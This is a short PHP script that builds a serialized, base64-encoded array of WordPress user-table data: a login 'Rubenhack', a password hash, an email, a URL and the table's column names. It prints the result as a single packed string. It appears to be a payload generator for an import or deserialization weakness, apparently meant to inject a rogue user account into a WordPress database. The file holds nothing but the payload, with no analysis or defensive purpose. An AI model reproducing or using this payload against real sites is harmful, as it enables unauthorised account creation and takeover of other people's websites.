<?php
	$contents = array(
	    'customData' => array('users' => array(
		0 => array('Rubenhack', 
		            '$P$Bh.SgWjitnOzsHcCwgj8VshKAYznVsddaE0', 
		            'Rubenhack', 
		            'Rubenhack@hotmail.com', 
		            'https://www.Rubenhack.com', 
		            '0', 
		            'Ruben hack', 
		    )
	    )), 
	    'customTablesColumsName' => array('users' => 
		array(
		    0 => array('Field' => 'user_login'), 
		    1 => array('Field' => 'user_pass'), 
		    2 => array('Field' => 'user_nicename'), 
		    4 => array('Field' => 'user_email'), 
		    5 => array('Field' => 'user_url'), 
		    6 => array('Field' => 'user_status'), 
		    7 => array('Field' => 'display_name'), 
		), 
	    )
	);

	$pack = base64_encode(serialize($contents));
	echo $pack;
?>
